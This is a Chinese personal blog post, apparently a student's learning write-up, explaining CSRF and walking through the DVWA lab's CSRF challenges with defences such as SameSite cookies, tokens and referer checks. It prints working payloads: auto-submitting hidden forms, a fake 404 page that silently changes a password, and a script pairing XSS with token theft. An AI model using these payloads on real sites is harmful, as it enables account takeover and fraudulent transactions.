@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="moMaxX">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="csrf漏洞浅谈"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="Momax&#39;s blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://moMaxX.github.io"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Momax&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Momax's blog</title>
+
+  <!-- Bootstrap CSS -->
+  
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+  <!-- Custom CSS -->
+  
+  
+<link rel="stylesheet" href="/css/style.light.css">
+
+
+  <!-- Google Analytics -->
+  
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+  	<!-- 雪花特效 --> 
+  
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-light.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">csrf漏洞浅谈</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/MomaxX" target="_blank" rel="noopener">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:194038819@qq.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By moMaxX</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-11-13</span>
+            <span class="time">00:48:55</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>@<a href="csrf漏洞浅谈">TOC</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>菜狗本人的手终于伸向了csrf漏洞攻击<strong>记录一下</strong></p>
+<h1 id="csrf漏洞介绍"><a href="#csrf漏洞介绍" class="headerlink" title="csrf漏洞介绍"></a>csrf漏洞介绍</h1><h2 id="什么是csrf"><a href="#什么是csrf" class="headerlink" title="什么是csrf"></a>什么是csrf</h2><p>csrf全称<code>Cross Site Request Forgery</code>，翻译过来就是<code>跨站域请求伪造</code>。是一种网络攻击手段。与xss不同，xss是利用受信任的用户，而csrf则是伪装成受信任用户。而csrf不太流行，所以一般认为xss比csrf更加具有危险性。</p>
+<h2 id="csrf怎样实现"><a href="#csrf怎样实现" class="headerlink" title="csrf怎样实现"></a>csrf怎样实现</h2><p>用csrf可以做什么？在菜鸡我的看法就是攻击者利用被攻击者发送受站点信任的请求，从而达到自身的某些目的。</p>
+<h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>假如张三在某银行存了一笔钱，某一天张三在该行的官网进行转账。假设官网ip为<code>http://csrfxj.com/zhuanzhang.php?name=ww&amp;money=1000</code>，而官网存在csrf漏洞，且是get请求方式，此时服务器收到请求后验证cookie等，确认是本人操作，所以会进行回复，操作成功。而如果李四想要从此处进行攻击，就会构造一个payload：<code>http://csrfxj.com/zhuanzhang.php?name=ls&amp;money=100000</code>，然后此时张三刚刚在官网进行了操作，cookie等还未过期，在李四的诱骗下点击了这个链接，后台服务器会再次响应，认为是本人操作，再次进行操作，这时就会发生，转账人<code>张三</code>，收钱人<code>李四</code>，金额<code>100000</code>。然后张三就会在不知情的时候进行了一笔稀里糊涂的转账。</p>
+<h2 id="csrf漏洞攻击原理"><a href="#csrf漏洞攻击原理" class="headerlink" title="csrf漏洞攻击原理"></a>csrf漏洞攻击原理</h2><p>我本来一直认为就是利用上述方式进行攻击，但是在看了大佬博客之后才知道csrf攻击分为两种方式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一、狭义的csrf攻击：指在攻击者已经将代码植入受害用户的浏览器访问的页面的前提下，以“受害用户”的身份向服务端发起一个伪造的http请求，从而实现服务器CURD来执行读写操作。</span><br><span class="line">二、广义的csrf攻击：攻击者将一个http接口中需要传递的所有参数都预测出来，然后不管以什么方式，都可以来任意调用你的接口，对服务器实现CURD</span><br></pre></td></tr></table></figure>
+<h2 id="csrf攻击产生条件"><a href="#csrf攻击产生条件" class="headerlink" title="csrf攻击产生条件"></a>csrf攻击产生条件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一、被攻击者在登陆了web网页，并且在本地生成了cookie</span><br><span class="line">二、在cookie未过期的情况下，登登录了攻击者的页面，利用同一个浏览器。</span><br></pre></td></tr></table></figure>
+<h1 id="csrf攻击的常见方式"><a href="#csrf攻击的常见方式" class="headerlink" title="csrf攻击的常见方式"></a>csrf攻击的常见方式</h1><p>csrf攻击一般分为GET型和POST型。<br>这里利用<a href="http://www.nanhack.com/payload/xss/csrf1.php" target="_blank" rel="noopener">必火团队的靶场</a>和本地搭建的DVWA靶场进行实验。</p>
+<h2 id="GET型方式"><a href="#GET型方式" class="headerlink" title="GET型方式"></a>GET型方式</h2><p><img src="https://img-blog.csdnimg.cn/20201112230440498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="必火团队靶场"><br>发现转账页面，正常转账会发现账户正常减少财产。当点击了下方提供的攻击者页面时，<img src="https://img-blog.csdnimg.cn/20201112230547357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="点击结果"><br>发现提示账户钱少了，回去查看，发现少了1000。查看攻击页面源码发现<img src="https://img-blog.csdnimg.cn/20201112230636790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="页面源码"><br>其中的<code>&lt;image src &gt;</code>属性标签里的链接，和正常转账是一样的，只是名字钱财不同。这是一种实现的方式。<br>在上面的例子中是直接构造的payload，隐蔽性太低，正常人一眼就能看出来不正常，所以一般会进行IP的隐藏<br>这里介绍几种常用的IP隐藏方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一、利用a标签</span><br><span class="line">二、利用HTML的src实现，在页面中不会进行显示</span><br><span class="line">三、利用background属性里的url功能链接</span><br></pre></td></tr></table></figure>
+<h2 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=<span class="string">"csrf"</span> action=<span class="string">"http://edu.xss.tv/payload/xss/csrf2.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"name"</span> value=<span class="string">"zhangsan520"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"money"</span> value=<span class="string">"1000"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;document.csrf.submit();&lt;/script&gt;</span><br><span class="line">&lt;a href=<span class="string">"http://edu.xss.tv/user.php"</span>&gt;返回用户管理&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>post方式一般是利用一个可以自动提交的表单进行攻击，当用户进入指定页面后会进行自动提交。达到目的。所以危害性没get方式高。</p>
+<h1 id="csrf漏洞检测"><a href="#csrf漏洞检测" class="headerlink" title="csrf漏洞检测"></a>csrf漏洞检测</h1><p>那么如何检测页面是否存在csrf漏洞呢？这里用的是brupsuit进行检测。<br>在浏览器里进行抓包，bp有一个<code>CSRF POC</code>功能，自动生成攻击页面，在里面修改参数，提交之后发现是否有变化，若有则存在反之没有。</p>
+<h1 id="csrf漏洞的防御"><a href="#csrf漏洞的防御" class="headerlink" title="csrf漏洞的防御"></a>csrf漏洞的防御</h1><blockquote>
+<p>CSRF的防御可以从两个方面考虑，一个是后台接口层做防御；另一个则是在前端做防御，这种不同源的请求，不可以带cookie。</p>
+</blockquote>
+<h2 id="前端防御"><a href="#前端防御" class="headerlink" title="前端防御"></a>前端防御</h2><blockquote>
+<p>谷歌提出了same-site cookies概念，same-site cookies 是基于 Chrome 和 Mozilla 开发者花了三年多时间制定的 IETF 标准。它是在原有的Cookie中，新添加了一个SameSite属性，它标识着在非同源的请求中，是否可以带上Cookie，它可以设置为3个值，分别为：Strict、Lax、None<br>Strict是最严格的，它完全禁止在跨站情况下，发送Cookie。只有在自己的网站内部发送请求，才会带上Cookie。不过这个规则过于严格，会影响用户的体验。比如在一个网站中有一个链接，这个链接连接到了GitHub上，由于SameSite设置为Strict，跳转到GitHub后，GitHub总是未登录状态。<br>Lax的规则稍稍放宽了些，大部分跨站的请求也不会带上Cookie，但是一些导航的Get请求会带上Cookie，如下：<br><img src="https://img-blog.csdnimg.cn/20201112231841983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="引用"><br>None就是关闭SameSite属性，所有的情况下都发送Cookie。不过SameSite设置None，还要同时设置Cookie的Secure属性，否则是不生效的。</p>
+</blockquote>
+<p>以上引用来自云栖社区一篇<a href="https://yq.aliyun.com/articles/738512" target="_blank" rel="noopener">很详细的博客</a> 如有侵权，联系删除。<br>因为我懒，所以就不自己总结了（坚持白嫖）。</p>
+<h2 id="后端防御"><a href="#后端防御" class="headerlink" title="后端防御"></a>后端防御</h2><blockquote>
+<p>第一种，CSRF Token的方式。这种方式是在表单页面生成一个随机数，这个随机数一定要后端生成，并且对这个随机数进行存储。<br>通过请求头中的referer字段判断请求的来源。每一个发送给后端的请求，在请求头中都会包含一个referer字段，这个字段标识着请求的来源。如果请求是从银行网站发出的，这个字段会是银行网站转账页的链接，比如：<a href="https://www.a-bank.com/transfer-view；如果是从恶意网站发出的，那么referer字段一定不会是银行网站" target="_blank" rel="noopener">https://www.a-bank.com/transfer-view；如果是从恶意网站发出的，那么referer字段一定不会是银行网站</a></p>
+</blockquote>
+<h1 id="DVWA靶场练习csrf攻击"><a href="#DVWA靶场练习csrf攻击" class="headerlink" title="DVWA靶场练习csrf攻击"></a>DVWA靶场练习csrf攻击</h1><h2 id="low难度"><a href="#low难度" class="headerlink" title="low难度"></a>low难度</h2><p>所谓low难度就是明显的没有难度。<br>拿到手之后直接url修改参数就实现了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>查看low难度的源码，首先进行判断两个新密码输入的值是否一样，若一样调用<code>mysql_real_escape_string()</code>函数来进行对字符串的过滤操作，然后调用<code>MD5</code>对new_password进行加密，保存到数据库中。<code>mysql_real_escape_string()</code>函数由于对字符串进行了过滤操作，所以有效的防止了sql注入操作，但是并没有对于csrf进行防御操作。因此可以进行csrf攻击。<br>正常的修改密码payload：<code>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code><br>直接对payload进行修改：<code>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=root&amp;password_conf=root&amp;Change=Change#</code><br>在上述操作中，密码就会由修改的password变为root。<img src="https://img-blog.csdnimg.cn/20201112233506238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="密码修改成功"><br>但是这样子用户一眼就能知道自己的密码被修改了，而且这个链接一般人肯定不会随便点的。所以接下来据要进行对这个链接的格式修改。</p>
+<h3 id="使用短链接进行格式修改"><a href="#使用短链接进行格式修改" class="headerlink" title="使用短链接进行格式修改"></a>使用短链接进行格式修改</h3><p><img src="https://img-blog.csdnimg.cn/20201112233813425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="修改成功"><br><a href="http://tool.chinaz.com/tools/dwz.aspx" target="_blank" rel="noopener">地址在这</a></p>
+<h3 id="构造攻击页面"><a href="#构造攻击页面" class="headerlink" title="构造攻击页面"></a>构造攻击页面</h3><p>在实际攻击中，攻击者可以利用自己构造的一个虚假页面让被攻击者点击来实现攻击操作。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;<span class="number">404</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;image src=<span class="string">"http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=root&amp;password_conf=root&amp;Change=Change#"</span> /&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>当被攻击者访问这个页面时，会出现假的404错误，被攻击者会认为自己进入了一个无效的网站，但实际上攻击已经产生了。</p>
+<h2 id="medium难度"><a href="#medium难度" class="headerlink" title="medium难度"></a>medium难度</h2><p>首先查看源码，发现比low多了一个判断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get input</span></span><br><span class="line">		$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">		$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br></pre></td></tr></table></figure>
+<p>也就是说，Medium级的代码检查了保留变量 HTTP_REFERER(http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME这一个方法来抵御csrf攻击，但是这种方式只需要将刚才那个页面名字修改为本地IP地址就可。<br><img src="https://img-blog.csdnimg.cn/20201112234808579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="源码"><br>这里看到预期修改为password，点击页面后，回到原来页面，测试发现密码修改成功。<img src="https://img-blog.csdnimg.cn/20201112234904680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="虚假404页面"><br><img src="https://img-blog.csdnimg.cn/2020111223492247.png#pic_center" alt="修改成功"></p>
+<h2 id="high难度"><a href="#high难度" class="headerlink" title="high难度"></a>high难度</h2><p>查看源码<br>发现比起medium多了一个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>
+<p>很明显high级的难度在防御机制中加入了token元素。即<code>用户每次访问改密页面时，服务器会返回一个随机的token。向服务器发起请求时，需要提交token参数。而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</code><br>看了大佬博客之后发现可以构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成 CSRF 攻击。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://127.0.0.1/DVWA/vulnerabilities/csrf/'</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">    xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">            <span class="keyword">var</span> regex = <span class="regexp">/user_token\' value\=\'(.*?)\' \/\&gt;/</span>;</span><br><span class="line">            <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">            <span class="built_in">console</span>.log(match);</span><br><span class="line">            alert(match[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">var</span> new_url = <span class="string">'http://127.0.0.1/DVWA/vulnerabilities/csrf/?user_token='</span>+token+<span class="string">'&amp;password_new=password&amp;password_conf=password&amp;Change=Change'</span>;</span><br><span class="line">                    <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">                        xmlhttp.send();</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="literal">false</span>);</span><br><span class="line">    xmlhttp.send();</span><br></pre></td></tr></table></figure>
+<p>将其放在攻击者的网络上，我由于是本地实验，所以放在了<code>http://127.0.0.1/xss.js</code>，然后心细的人发现了，这个应该是xss攻击吧？没错，看大佬博客使用的就是xss和csrf相结合的方法实现攻击的。<br>然后构造payload：<code>http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English #&lt;script src=&quot;http://www.127.0.0.1.com/xss.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>然后诱导被攻击者点击这个链接实现攻击操作。<br>但是自身实践出现错误，百度发现，现在的浏览器不允许跨域访问，所以求教了大师傅之后，发现了另一个方法，bp抓包，修改参数。看了团队内的大佬博客之后，知道可以利用<code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code>来实现token获取。<br>在DVWA的xss页面，进行抓包<img src="https://img-blog.csdnimg.cn/20201113003432172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="抓包"><br>修改参数<br><img src="https://img-blog.csdnimg.cn/20201113003528807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="修改"><br>之后进行放包。得到浏览器页面<br><img src="https://img-blog.csdnimg.cn/20201113003559763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="浏览器页面"><br>在这里修改密码<br><img src="https://img-blog.csdnimg.cn/20201113003623505.png#pic_center" alt="得到token"><br>然后构造一个自动点击的页面</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">"GET"</span> action=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/csrf"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_new"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">'hidden'</span> name=<span class="string">'user_token'</span> value=<span class="string">"8c662c2b09db59c12c190ffd8ec23a00"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span> id=<span class="string">"onlick"</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"onclick"</span>).click();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后诱导用户点击，<img src="https://img-blog.csdnimg.cn/20201113004503268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="修改成功"><br>修改成功。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>对于impossible难度暂时没有打算尝试，毕竟high难度还有点一知半解，等后期更加深入了解了之后再回来补充。</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+
+<script src="/js/highlight.pack.js"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
